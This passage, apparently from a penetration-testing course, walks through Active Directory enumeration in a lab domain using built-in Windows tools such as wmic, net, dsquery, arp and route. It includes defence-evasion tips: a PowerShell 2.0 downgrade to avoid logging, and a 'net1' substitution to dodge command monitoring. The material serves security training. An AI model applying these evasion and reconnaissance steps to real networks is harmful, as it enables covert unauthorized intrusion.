-PROCESSOR_IDENTIFIER    AMD64 Family 23 Model 49 Stepping 0, AuthenticAMD
-PROCESSOR_LEVEL         23
-PROCESSOR_REVISION      3100
-ProgramData             C:\ProgramData
-ProgramFiles            C:\Program Files (x86)
-ProgramFiles(x86)       C:\Program Files (x86)
-ProgramW6432            C:\Program Files
-PROMPT                  $P$G
-PSModulePath            C:\Program Files\WindowsPowerShell\Modules;WindowsPowerShell\Modules;C:\Program Files (x86)\...
-PUBLIC                  C:\Users\Public
-SystemDrive             C:
-SystemRoot              C:\Windows
-TEMP                    C:\Windows\TEMP
-TMP                     C:\Windows\TEMP
-USERDOMAIN              INLANEFREIGHT
-USERNAME                ACADEMY-EA-MS01$
-USERPROFILE             C:\Windows\system32\config\systemprofile
-windir                  C:\Windows
-
-We have performed basic enumeration of the host. Now, let's discuss a few operational security tactics.
-
-Many defenders are unaware that several versions of PowerShell often exist on a host. If not uninstalled, they can still be used. Powershell event logging was introduced as a feature with Powershell 3.0 and forward. With that in mind, we can attempt to call Powershell version 2.0 or older. If successful, our actions from the shell will not be logged in Event Viewer. This is a great way for us to remain under the defenders' radar while still utilizing resources built into the hosts to our advantage. Below is an example of downgrading Powershell.
-Downgrade Powershell
-Downgrade Powershell
-
-PS C:\htb> Get-host
-
-Name             : ConsoleHost
-Version          : 5.1.19041.1320
-InstanceId       : 18ee9fb4-ac42-4dfe-85b2-61687291bbfc
-UI               : System.Management.Automation.Internal.Host.InternalHostUserInterface
-CurrentCulture   : en-US
-CurrentUICulture : en-US
-PrivateData      : Microsoft.PowerShell.ConsoleHost+ConsoleColorProxy
-DebuggerEnabled  : True
-IsRunspacePushed : False
-Runspace         : System.Management.Automation.Runspaces.LocalRunspace
-
-PS C:\htb> powershell.exe -version 2
-Windows PowerShell
-Copyright (C) 2009 Microsoft Corporation. All rights reserved.
-
-PS C:\htb> Get-host
-Name             : ConsoleHost
-Version          : 2.0
-InstanceId       : 121b807c-6daa-4691-85ef-998ac137e469
-UI               : System.Management.Automation.Internal.Host.InternalHostUserInterface
-CurrentCulture   : en-US
-CurrentUICulture : en-US
-PrivateData      : Microsoft.PowerShell.ConsoleHost+ConsoleColorProxy
-IsRunspacePushed : False
-Runspace         : System.Management.Automation.Runspaces.LocalRunspace
-
-PS C:\htb> get-module
-
-ModuleType Version    Name                                ExportedCommands
----------- -------    ----                                ----------------
-Script     0.0        chocolateyProfile                   {TabExpansion, Update-SessionEnvironment, refreshenv}
-Manifest   3.1.0.0    Microsoft.PowerShell.Management     {Add-Computer, Add-Content, Checkpoint-Computer, Clear-Content...}
-Manifest   3.1.0.0    Microsoft.PowerShell.Utility        {Add-Member, Add-Type, Clear-Variable, Compare-Object...}
-Script     0.7.3.1    posh-git                            {Add-PoshGitToProfile, Add-SshKey, Enable-GitColors, Expand-GitCommand...}
-Script     2.0.0      PSReadline                          {Get-PSReadLineKeyHandler, Get-PSReadLineOption, Remove-PSReadLineKeyHandler...
-
-We can now see that we are running an older version of PowerShell from the output above. Notice the difference in the version reported. It validates we have successfully downgraded the shell. Let's check and see if we are still writing logs. The primary place to look is in the PowerShell Operational Log found under Applications and Services Logs > Microsoft > Windows > PowerShell > Operational. All commands executed in our session will log to this file. The Windows PowerShell log located at Applications and Services Logs > Windows PowerShell is also a good place to check. An entry will be made here when we start an instance of PowerShell. In the image below, we can see the red entries made to the log from the current PowerShell session and the output of the last entry made at 2:12 pm when the downgrade is performed. It was the last entry since our session moved into a version of PowerShell no longer capable of logging. Notice that, that event corresponds with the last event in the Windows PowerShell log entries.
-Examining the Powershell Event Log
-
-text
-
-With Script Block Logging enabled, we can see that whatever we type into the terminal gets sent to this log. If we downgrade to PowerShell V2, this will no longer function correctly. Our actions after will be masked since Script Block Logging does not work below PowerShell 3.0. Notice above in the logs that we can see the commands we issued during a normal shell session, but it stopped after starting a new PowerShell instance in version 2. Be aware that the action of issuing the command powershell.exe -version 2 within the PowerShell session will be logged. So evidence will be left behind showing that the downgrade happened, and a suspicious or vigilant defender may start an investigation after seeing this happen and the logs no longer filling up for that instance. We can see an example of this in the image below. Items in the red box are the log entries before starting the new instance, and the info in green is the text showing a new PowerShell session was started in HostVersion 2.0.
-Starting V2 Logs
-
-text
-Checking Defenses
-
-The next few commands utilize the netsh and sc utilities to help us get a feel for the state of the host when it comes to Windows Firewall settings and to check the status of Windows Defender.
-Firewall Checks
-Firewall Checks
-
-PS C:\htb> netsh advfirewall show allprofiles
-
-Domain Profile Settings:
-----------------------------------------------------------------------
-State                                 OFF
-Firewall Policy                       BlockInbound,AllowOutbound
-LocalFirewallRules                    N/A (GPO-store only)
-LocalConSecRules                      N/A (GPO-store only)
-InboundUserNotification               Disable
-RemoteManagement                      Disable
-UnicastResponseToMulticast            Enable
-
-Logging:
-LogAllowedConnections                 Disable
-LogDroppedConnections                 Disable
-FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log
-MaxFileSize                           4096
-
-Private Profile Settings:
-----------------------------------------------------------------------
-State                                 OFF
-Firewall Policy                       BlockInbound,AllowOutbound
-LocalFirewallRules                    N/A (GPO-store only)
-LocalConSecRules                      N/A (GPO-store only)
-InboundUserNotification               Disable
-RemoteManagement                      Disable
-UnicastResponseToMulticast            Enable
-
-Logging:
-LogAllowedConnections                 Disable
-LogDroppedConnections                 Disable
-FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log
-MaxFileSize                           4096
-
-Public Profile Settings:
-----------------------------------------------------------------------
-State                                 OFF
-Firewall Policy                       BlockInbound,AllowOutbound
-LocalFirewallRules                    N/A (GPO-store only)
-LocalConSecRules                      N/A (GPO-store only)
-InboundUserNotification               Disable
-RemoteManagement                      Disable
-UnicastResponseToMulticast            Enable
-
-Logging:
-LogAllowedConnections                 Disable
-LogDroppedConnections                 Disable
-FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log
-MaxFileSize                           4096
-
-Windows Defender Check (from CMD.exe)
-Windows Defender Check (from CMD.exe)
-
-C:\htb> sc query windefend
-
-SERVICE_NAME: windefend
-        TYPE               : 10  WIN32_OWN_PROCESS
-        STATE              : 4  RUNNING
-                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
-        WIN32_EXIT_CODE    : 0  (0x0)
-        SERVICE_EXIT_CODE  : 0  (0x0)
-        CHECKPOINT         : 0x0
-        WAIT_HINT          : 0x0
-
-Above, we checked if Defender was running. Below we will check the status and configuration settings with the Get-MpComputerStatus cmdlet in PowerShell.
-Get-MpComputerStatus
-Get-MpComputerStatus
-
-PS C:\htb> Get-MpComputerStatus
-
-AMEngineVersion                  : 1.1.19000.8
-AMProductVersion                 : 4.18.2202.4
-AMRunningMode                    : Normal
-AMServiceEnabled                 : True
-AMServiceVersion                 : 4.18.2202.4
-AntispywareEnabled               : True
-AntispywareSignatureAge          : 0
-AntispywareSignatureLastUpdated  : 3/21/2022 4:06:15 AM
-AntispywareSignatureVersion      : 1.361.414.0
-AntivirusEnabled                 : True
-AntivirusSignatureAge            : 0
-AntivirusSignatureLastUpdated    : 3/21/2022 4:06:16 AM
-AntivirusSignatureVersion        : 1.361.414.0
-BehaviorMonitorEnabled           : True
-ComputerID                       : FDA97E38-1666-4534-98D4-943A9A871482
-ComputerState                    : 0
-DefenderSignaturesOutOfDate      : False
-DeviceControlDefaultEnforcement  : Unknown
-DeviceControlPoliciesLastUpdated : 3/20/2022 9:08:34 PM
-DeviceControlState               : Disabled
-FullScanAge                      : 4294967295
-FullScanEndTime                  :
-FullScanOverdue                  : False
-FullScanRequired                 : False
-FullScanSignatureVersion         :
-FullScanStartTime                :
-IoavProtectionEnabled            : True
-IsTamperProtected                : True
-IsVirtualMachine                 : False
-LastFullScanSource               : 0
-LastQuickScanSource              : 2
-
-<SNIP>
-
-Knowing what revision our AV settings are at and what settings are enabled/disabled can greatly benefit us. We can tell how often scans are run, if the on-demand threat alerting is active, and more. This is also great info for reporting. Often defenders may think that certain settings are enabled or scans are scheduled to run at certain intervals. If that's not the case, these findings can help them remediate those issues.
-Am I Alone?
-
-When landing on a host for the first time, one important thing is to check and see if you are the only one logged in. If you start taking actions from a host someone else is on, there is the potential for them to notice you. If a popup window launches or a user is logged out of their session, they may report these actions or change their password, and we could lose our foothold.
-Get-MpComputerStatus
-
-PS C:\htb> qwinsta
-
- SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
- services                                    0  Disc
->console           forend                    1  Active
- rdp-tcp                                 65536  Listen
-
-Now that we have a solid feel for the state of our host, we can enumerate the network settings for our host and identify any potential domain machines or services we may want to target next.
-Network Information
-Networking Commands 	Description
-arp -a 	Lists all known hosts stored in the arp table.
-ipconfig /all 	Prints out adapter settings for the host. We can figure out the network segment from here.
-route print 	Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host.
-netsh advfirewall show state 	Displays the status of the host's firewall. We can determine if it is active and filtering traffic.
-
-Commands such as ipconfig /all and systeminfo show us some basic networking configurations. Two more important commands provide us with a ton of valuable data and could help us further our access. arp -a and route print will show us what hosts the box we are on is aware of and what networks are known to the host. Any networks that appear in the routing table are potential avenues for lateral movement because they are accessed enough that a route was added, or it has administratively been set there so that the host knows how to access resources on the domain. These two commands can be especially helpful in the discovery phase of a black box assessment where we have to limit our scanning
-Using arp -a
-Using arp -a
-
-PS C:\htb> arp -a
-
-Interface: 172.16.5.25 --- 0x8
-  Internet Address      Physical Address      Type
-  172.16.5.5            00-50-56-b9-08-26     dynamic
-  172.16.5.130          00-50-56-b9-f0-e1     dynamic
-  172.16.5.240          00-50-56-b9-9d-66     dynamic
-  224.0.0.22            01-00-5e-00-00-16     static
-  224.0.0.251           01-00-5e-00-00-fb     static
-  224.0.0.252           01-00-5e-00-00-fc     static
-  239.255.255.250       01-00-5e-7f-ff-fa     static
-
-Interface: 10.129.201.234 --- 0xc
-  Internet Address      Physical Address      Type
-  10.129.0.1            00-50-56-b9-b9-fc     dynamic
-  10.129.202.29         00-50-56-b9-26-8d     dynamic
-  10.129.255.255        ff-ff-ff-ff-ff-ff     static
-  224.0.0.22            01-00-5e-00-00-16     static
-  224.0.0.251           01-00-5e-00-00-fb     static
-  224.0.0.252           01-00-5e-00-00-fc     static
-  239.255.255.250       01-00-5e-7f-ff-fa     static
-  255.255.255.255       ff-ff-ff-ff-ff-ff     static
-
-Viewing the Routing Table
-Viewing the Routing Table
-
-PS C:\htb> route print
-
-===========================================================================
-Interface List
-  8...00 50 56 b9 9d d9 ......vmxnet3 Ethernet Adapter #2
- 12...00 50 56 b9 de 92 ......vmxnet3 Ethernet Adapter
-  1...........................Software Loopback Interface 1
-===========================================================================
-
-IPv4 Route Table
-===========================================================================
-Active Routes:
-Network Destination        Netmask          Gateway       Interface  Metric
-          0.0.0.0          0.0.0.0       172.16.5.1      172.16.5.25    261
-          0.0.0.0          0.0.0.0       10.129.0.1   10.129.201.234     20
-       10.129.0.0      255.255.0.0         On-link    10.129.201.234    266
-   10.129.201.234  255.255.255.255         On-link    10.129.201.234    266
-   10.129.255.255  255.255.255.255         On-link    10.129.201.234    266
-        127.0.0.0        255.0.0.0         On-link         127.0.0.1    331
-        127.0.0.1  255.255.255.255         On-link         127.0.0.1    331
-  127.255.255.255  255.255.255.255         On-link         127.0.0.1    331
-       172.16.4.0    255.255.254.0         On-link       172.16.5.25    261
-      172.16.5.25  255.255.255.255         On-link       172.16.5.25    261
-     172.16.5.255  255.255.255.255         On-link       172.16.5.25    261
-        224.0.0.0        240.0.0.0         On-link         127.0.0.1    331
-        224.0.0.0        240.0.0.0         On-link    10.129.201.234    266
-        224.0.0.0        240.0.0.0         On-link       172.16.5.25    261
-  255.255.255.255  255.255.255.255         On-link         127.0.0.1    331
-  255.255.255.255  255.255.255.255         On-link    10.129.201.234    266
-  255.255.255.255  255.255.255.255         On-link       172.16.5.25    261
-  ===========================================================================
-Persistent Routes:
-  Network Address          Netmask  Gateway Address  Metric
-          0.0.0.0          0.0.0.0       172.16.5.1  Default
-===========================================================================
-
-IPv6 Route Table
-===========================================================================
-
-<SNIP>
-
-Using arp -a and route print will not only benefit in enumerating AD environments, but will also assist us in identifying opportunities to pivot to different network segments in any environment. These are commands we should consider using on each engagement to assist our clients in understanding where an attacker may attempt to go following initial compromise.
-Windows Management Instrumentation (WMI)
-
-Windows Management Instrumentation (WMI) is a scripting engine that is widely used within Windows enterprise environments to retrieve information and run administrative tasks on local and remote hosts. For our usage, we will create a WMI report on domain users, groups, processes, and other information from our host and other domain hosts.
-Quick WMI checks
-Command 	Description
-wmic qfe get Caption,Description,HotFixID,InstalledOn 	Prints the patch level and description of the Hotfixes applied
-wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List 	Displays basic host information to include any attributes within the list
-wmic process list /format:list 	A listing of all processes on host
-wmic ntdomain list /format:list 	Displays information about the Domain and Domain Controllers
-wmic useraccount list /format:list 	Displays information about all local accounts and any domain accounts that have logged into the device
-wmic group list /format:list 	Information about all local groups
-wmic sysaccount list /format:list 	Dumps information about any system accounts that are being used as service accounts.
-
-Below we can see information about the domain and the child domain, and the external forest that our current domain has a trust with. This cheatsheet has some useful commands for querying host and domain info using wmic.
-Quick WMI checks
-
-PS C:\htb> wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress
-
-Caption          Description      DnsForestName           DomainControllerAddress  DomainName
-ACADEMY-EA-MS01  ACADEMY-EA-MS01
-INLANEFREIGHT    INLANEFREIGHT    INLANEFREIGHT.LOCAL     \\172.16.5.5             INLANEFREIGHT
-LOGISTICS        LOGISTICS        INLANEFREIGHT.LOCAL     \\172.16.5.240           LOGISTICS
-FREIGHTLOGISTIC  FREIGHTLOGISTIC  FREIGHTLOGISTICS.LOCAL  \\172.16.5.238           FREIGHTLOGISTIC
-
-WMI is a vast topic, and it would be impossible to touch on everything it is capable of in one part of a section. For more information about WMI and its capabilities, check out the official WMI documentation.
-Net Commands
-
-Net commands can be beneficial to us when attempting to enumerate information from the domain. These commands can be used to query the local host and remote hosts, much like the capabilities provided by WMI. We can list information such as:
-
-    Local and domain users
-    Groups
-    Hosts
-    Specific users in groups
-    Domain Controllers
-    Password requirements
-
-We'll cover a few examples below. Keep in mind that net.exe commands are typically monitored by EDR solutions and can quickly give up our location if our assessment has an evasive component. Some organizations will even configure their monitoring tools to throw alerts if certain commands are run by users in specific OUs, such as a Marketing Associate's account running commands such as whoami, and net localgroup administrators, etc. This could be an obvious red flag to anyone monitoring the network heavily.
-Table of Useful Net Commands
-Command 	Description
-net accounts 	Information about password requirements
-net accounts /domain 	Password and lockout policy
-net group /domain 	Information about domain groups
-net group "Domain Admins" /domain 	List users with domain admin privileges
-net group "domain computers" /domain 	List of PCs connected to the domain
-net group "Domain Controllers" /domain 	List PC accounts of domains controllers
-net group <domain_group_name> /domain 	User that belongs to the group
-net groups /domain 	List of domain groups
-net localgroup 	All available groups
-net localgroup administrators /domain 	List users that belong to the administrators group inside the domain (the group Domain Admins is included here by default)
-net localgroup Administrators 	Information about a group (admins)
-net localgroup administrators [username] /add 	Add user to administrators
-net share 	Check current shares
-net user <ACCOUNT_NAME> /domain 	Get information about a user within the domain
-net user /domain 	List all users of the domain
-net user %username% 	Information about the current user
-net use x: \computer\share 	Mount the share locally
-net view 	Get a list of computers
-net view /all /domain[:domainname] 	Shares on the domains
-net view \computer /ALL 	List shares of a computer
-net view /domain 	List of PCs of the domain
-Listing Domain Groups
-Listing Domain Groups
-
-PS C:\htb> net group /domain
-
-The request will be processed at a domain controller for domain INLANEFREIGHT.LOCAL.
-
-Group Accounts for \\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
--------------------------------------------------------------------------------
-*$H25000-1RTRKC5S507F
-*Accounting
-*Barracuda_all_access
-*Barracuda_facebook_access
-*Barracuda_parked_sites
-*Barracuda_youtube_exempt
-*Billing
-*Billing_users
-*Calendar Access
-*CEO
-*CFO
-*Cloneable Domain Controllers
-*Collaboration_users
-*Communications_users
-*Compliance Management
-*Computer Group Management
-*Contractors
-*CTO
-
-<SNIP>
-
-We can see above the net group command provided us with a list of groups within the domain.
-Information about a Domain User
-Information about a Domain User
-
-PS C:\htb> net user /domain wrouse
-
-The request will be processed at a domain controller for domain INLANEFREIGHT.LOCAL.
-
-User name                    wrouse
-Full Name                    Christopher Davis
-Comment
-User's comment
-Country/region code          000 (System Default)
-Account active               Yes
-Account expires              Never
-
-Password last set            10/27/2021 10:38:01 AM
-Password expires             Never
-Password changeable          10/28/2021 10:38:01 AM
-Password required            Yes
-User may change password     Yes
-
-Workstations allowed         All
-Logon script
-User profile
-Home directory
-Last logon                   Never
-
-Logon hours allowed          All
-
-Local Group Memberships
-Global Group memberships     *File Share G Drive   *File Share H Drive
-                             *Warehouse            *Printer Access
-                             *Domain Users         *VPN Users
-                             *Shared Calendar Read
-The command completed successfully.
-
-Net Commands Trick
-
-If you believe the network defenders are actively logging/looking for any commands out of the normal, you can try this workaround to using net commands. Typing net1 instead of net will execute the same functions without the potential trigger from the net string.
-Running Net1 Command
-
-image
-Dsquery
-
-Dsquery is a helpful command-line tool that can be utilized to find Active Directory objects. The queries we run with this tool can be easily replicated with tools like BloodHound and PowerView, but we may not always have those tools at our disposal, as discussed at the beginning of the section. But, it is a likely tool that domain sysadmins are utilizing in their environment. With that in mind, dsquery will exist on any host with the Active Directory Domain Services Role installed, and the dsquery DLL exists on all modern Windows systems by default now and can be found at C:\Windows\System32\dsquery.dll.
-Dsquery DLL
-
-All we need is elevated privileges on a host or the ability to run an instance of Command Prompt or PowerShell from a SYSTEM context. Below, we will show the basic search function with dsquery and a few helpful search filters.
-User Search
-User Search
-
-PS C:\htb> dsquery user
-
-"CN=Administrator,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
-"CN=Guest,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
-"CN=lab_adm,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
-"CN=krbtgt,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
-"CN=Htb Student,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
-"CN=Annie Vazquez,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
-"CN=Paul Falcon,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
-"CN=Fae Anthony,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
-"CN=Walter Dillard,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
-"CN=Louis Bradford,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
-"CN=Sonya Gage,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
-"CN=Alba Sanchez,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
-"CN=Daniel Branch,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
-"CN=Christopher Cruz,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
-"CN=Nicole Johnson,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
-"CN=Mary Holliday,OU=Human Resources,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
-"CN=Michael Shoemaker,OU=Human Resources,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
-"CN=Arlene Slater,OU=Human Resources,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
-"CN=Kelsey Prentiss,OU=Human Resources,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
-
-Computer Search
-Computer Search
-
-PS C:\htb> dsquery computer
-
-"CN=ACADEMY-EA-DC01,OU=Domain Controllers,DC=INLANEFREIGHT,DC=LOCAL"
-"CN=ACADEMY-EA-MS01,OU=Web Servers,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
-"CN=ACADEMY-EA-MX01,OU=Mail,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
-"CN=SQL01,OU=SQL Servers,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
-"CN=ILF-XRG,OU=Critical,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
-"CN=MAINLON,OU=Critical,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
-"CN=CISERVER,OU=Critical,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
-"CN=INDEX-DEV-LON,OU=LON,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
-"CN=SQL-0253,OU=SQL Servers,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
-"CN=NYC-0615,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
-"CN=NYC-0616,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
-"CN=NYC-0617,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
-"CN=NYC-0618,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
-"CN=NYC-0619,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
-"CN=NYC-0620,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
-"CN=NYC-0621,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
-"CN=NYC-0622,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
-"CN=NYC-0623,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
-"CN=LON-0455,OU=LON,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
-"CN=LON-0456,OU=LON,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
-"CN=LON-0457,OU=LON,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
-"CN=LON-0458,OU=LON,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
-
-We can use a dsquery wildcard search to view all objects in an OU, for example.
-Wildcard Search
-Wildcard Search
-
-PS C:\htb> dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
-
-"CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
-"CN=krbtgt,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
-"CN=Domain Computers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
-"CN=Domain Controllers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
-"CN=Schema Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
-"CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
-"CN=Cert Publishers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
-"CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
-"CN=Domain Users,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
-"CN=Domain Guests,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
-"CN=Group Policy Creator Owners,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
-"CN=RAS and IAS Servers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
-"CN=Allowed RODC Password Replication Group,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
-"CN=Denied RODC Password Replication Group,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
-"CN=Read-only Domain Controllers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
-"CN=Enterprise Read-only Domain Controllers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
-"CN=Cloneable Domain Controllers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
-"CN=Protected Users,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
-"CN=Key Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
-"CN=Enterprise Key Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
-"CN=DnsAdmins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
-"CN=DnsUpdateProxy,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
-"CN=certsvc,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
-"CN=Jessica Ramsey,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
-"CN=svc_vmwaresso,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
-
-<SNIP>
-
-We can, of course, combine dsquery with LDAP search filters of our choosing. The below looks for users with the PASSWD_NOTREQD flag set in the userAccountControl attribute.
-Users With Specific Attributes Set (PASSWD_NOTREQD)
-Users With Specific Attributes Set (PASSWD_NOTREQD)
-
-PS C:\htb> dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
-
-  distinguishedName                                                                              userAccountControl
-  CN=Guest,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                                    66082
-  CN=Marion Lowe,OU=HelpDesk,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL      66080
-  CN=Yolanda Groce,OU=HelpDesk,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL    66080
-  CN=Eileen Hamilton,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL    66080
-  CN=Jessica Ramsey,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                           546
-  CN=NAGIOSAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL                           544
-  CN=LOGISTICS$,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                               2080
-  CN=FREIGHTLOGISTIC$,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                         2080
-
-The below search filter looks for all Domain Controllers in the current domain, limiting to five results.
-Searching for Domain Controllers
-Searching for Domain Controllers
-
-PS C:\Users\forend.INLANEFREIGHT> dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
-
- sAMAccountName
- ACADEMY-EA-DC01$
-
-LDAP Filtering Explained
-
-You will notice in the queries above that we are using strings such as userAccountControl:1.2.840.113556.1.4.803:=8192. These strings are common LDAP queries that can be used with several different tools too, including AD PowerShell, ldapsearch, and many others. Let's break them down quickly:
-
-userAccountControl:1.2.840.113556.1.4.803: Specifies that we are looking at the User Account Control (UAC) attributes for an object. This portion can change to include three different values we will explain below when searching for information in AD (also known as Object Identifiers (OIDs).
-=8192 represents the decimal bitmask we want to match in this search. This decimal number corresponds to a corresponding UAC Attribute flag that determines if an attribute like password is not required or account is locked is set. These values can compound and make multiple different bit entries. Below is a quick list of potential values.
-UAC Values
-
-text
-OID match strings
-
-OIDs are rules used to match bit values with attributes, as seen above. For LDAP and AD, there are three main matching rules:
-
-    1.2.840.113556.1.4.803
-
-When using this rule as we did in the example above, we are saying the bit value must match completely to meet the search requirements. Great for matching a singular attribute.
-
-    1.2.840.113556.1.4.804
-
-When using this rule, we are saying that we want our results to show any attribute match if any bit in the chain matches. This works in the case of an object having multiple attributes set.
-
-    1.2.840.113556.1.4.1941
-
-This rule is used to match filters that apply to the Distinguished Name of an object and will search through all ownership and membership entries.
-Logical Operators
-
-When building out search strings, we can utilize logical operators to combine values for the search. The operators & | and ! are used for this purpose. For example we can combine multiple search criteria with the & (and) operator like so:
-(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=64))
-
-The above example sets the first criteria that the object must be a user and combines it with searching for a UAC bit value of 64 (Password Can't Change). A user with that attribute set would match the filter. You can take this even further and combine multiple attributes like (&(1) (2) (3)). The ! (not) and | (or) operators can work similarly. For example, our filter above can be modified as follows:
-(&(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=64))
-
-This would search for any user object that does NOT have the Password Can't Change attribute set. When thinking about users, groups, and other objects in AD, our ability to search with LDAP queries is pretty extensive.
-
-A lot can be done with UAC filters, operators, and attribute matching with OID rules. For now, this general explanation should be sufficient to cover this module. For more information and a deeper dive into using this type of filter searching, see the Active Directory LDAP module.
-
-We have now used our foothold to perform credentialed enumeration with tools on Linux and Windows attack hosts and using built-in tools and validated host and domain information. We have proven that we can access internal hosts, password spraying, and LLMNR/NBT-NS poisoning works and that we can utilize tools that already reside on the hosts to perform our actions. Now we will take it a step further and tackle a TTP every AD pentester should have in their toolbelt, Kerberoasting.
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
